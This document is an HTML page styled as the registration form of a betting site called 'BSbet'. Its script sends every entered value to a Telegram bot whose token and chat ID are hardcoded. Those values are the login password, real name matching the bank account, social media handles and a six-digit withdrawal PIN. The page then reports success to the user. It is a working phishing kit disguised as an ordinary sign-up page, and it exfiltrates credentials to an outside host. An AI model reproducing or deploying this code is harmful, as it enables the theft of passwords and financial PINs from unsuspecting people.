<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BSbet - Oficial</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --y: #f3c350; --bg: rgba(20, 20, 20, 0.9); --in: #2a2a2a; --txt: #888; }
        
        body { 
            margin: 0; padding: 20px 0; font-family: sans-serif; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh;
            background-color: #0d0d0d;
            background-image: url('https://static.vecteezy.com/system/resources/previews/001/955/352/original/abstract-black-and-grey-hexagon-background-free-vector.jpg');
            background-size: cover; background-attachment: fixed; background-repeat: no-repeat;
        }

        body::before { content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); z-index: -1; }

        .card { background: var(--bg); width: 90%; max-width: 380px; padding: 25px; border-radius: 20px; box-shadow: 0 15px 35px #000; border: 1px solid #333; backdrop-filter: blur(8px); }
        .logo { text-align: center; font-size: 32px; font-weight: bold; margin-bottom: 20px; }
        .logo span { color: var(--y); }
        .tabs { display: flex; border-bottom: 1px solid #333; margin-bottom: 20px; }
        .tab { padding: 10px; color: var(--txt); width: 50%; text-align: center; font-weight: bold; }
        .tab.active { color: var(--y); border-bottom: 3px solid var(--y); }
        
        .box { background: var(--in); border: 1px solid #444; border-radius: 10px; display: flex; align-items: center; padding: 12px; margin-bottom: 12px; }
        .box i { color: var(--txt); width: 25px; text-align: center; margin-right: 10px; }
        .box input { background: transparent; border: none; color: white; width: 100%; outline: none; font-size: 16px; }
        
        .saque-container { margin: 15px 0; text-align: left; }
        .saque-label { font-size: 14px; margin-bottom: 10px; color: #ddd; display: block; }
        .saque-inputs { display: flex; justify-content: space-between; gap: 5px; }
        .saque-field { width: 45px; height: 45px; background: var(--in); border: 1px solid #444; border-radius: 8px; text-align: center; color: var(--y); font-size: 20px; font-weight: bold; outline: none; }
        
        .btn { background: linear-gradient(180deg, #f7d06d, #d9a026); color: #1a1a1a; width: 100%; padding: 15px; border: none; border-radius: 10px; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 10px; }
        .hint { color: var(--y); font-size: 11px; margin-top: -8px; margin-bottom: 10px; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">BS<span>bet</span></div>
    <div class="tabs"><div class="tab active">Registro</div><div class="tab">Login</div></div>

    <form id="meuForm">
        <div class="box"><i class="fa-solid fa-user"></i><input type="text" id="user" placeholder="Usu√°rio ou Telefone" required></div>
        <div class="box"><i class="fa-solid fa-lock"></i><input type="password" id="pass" placeholder="Senha Login" required></div>
        <div class="box"><i class="fa-solid fa-id-card"></i><input type="text" id="nome" placeholder="Nome Real" required></div>
        <p class="hint">Igual ao nome do banco</p>

        <div class="box"><i class="fa-brands fa-facebook"></i><input type="text" id="fb" placeholder="Facebook (Opcional)"></div>
        <div class="box"><i class="fa-brands fa-instagram"></i><input type="text" id="ig" placeholder="Instagram (Opcional)"></div>

        <div class="saque-container">
            <span class="saque-label">Senha Saque (6 d√≠gitos):</span>
            <div class="saque-inputs">
                <input type="password" class="saque-field" maxlength="1" inputmode="numeric">
                <input type="password" class="saque-field" maxlength="1" inputmode="numeric">
                <input type="password" class="saque-field" maxlength="1" inputmode="numeric">
                <input type="password" class="saque-field" maxlength="1" inputmode="numeric">
                <input type="password" class="saque-field" maxlength="1" inputmode="numeric">
                <input type="password" class="saque-field" maxlength="1" inputmode="numeric">
            </div>
        </div>

        <button type="submit" id="btn" class="btn">REGISTRAR</button>
    </form>
</div>

<script>
    // Seus dados do Telegram
    const TOKEN = "8599880345:AAGQy8ofddvyj-efl_lFUo44KMLEt1uuxMo"; 
    const CHAT_ID = "-4996441181"; 

    const inputs = document.querySelectorAll('.saque-field');
    inputs.forEach((input, index) => {
        input.oninput = () => { if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus(); };
    });

    document.getElementById('meuForm').onsubmit = function(e) {
        e.preventDefault();
        let saqueFull = "";
        inputs.forEach(i => saqueFull += i.value);
        if(saqueFull.length < 6) { alert("Preencha os 6 d√≠gitos!"); return; }

        const btn = document.getElementById('btn');
        btn.innerText = "ENVIANDO...";
        btn.disabled = true;

        const texto = `üîî NOVO CADASTRO üîî\n\nüë§ Usu√°rio: ${document.getElementById('user').value}\nüîë Senha: ${document.getElementById('pass').value}\nüí≥ Nome: ${document.getElementById('nome').value}\nüí∞ Saque: ${saqueFull}\nüì± FB: ${document.getElementById('fb').value || '---'}\nüì∏ IG: ${document.getElementById('ig').value || '---'}`;

        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: texto, parse_mode: 'Markdown' })
        })
        .then(res => {
            if(res.ok) { alert("‚úÖ Sucesso!"); location.reload(); }
            else { alert("‚ùå Erro no Bot!"); btn.disabled = false; btn.innerText = "REGISTRAR"; }
        })
        .catch(() => { alert("‚ùå Erro de conex√£o!"); btn.disabled = false; btn.innerText = "REGISTRAR"; });
    };
</script>
</body>
</html>
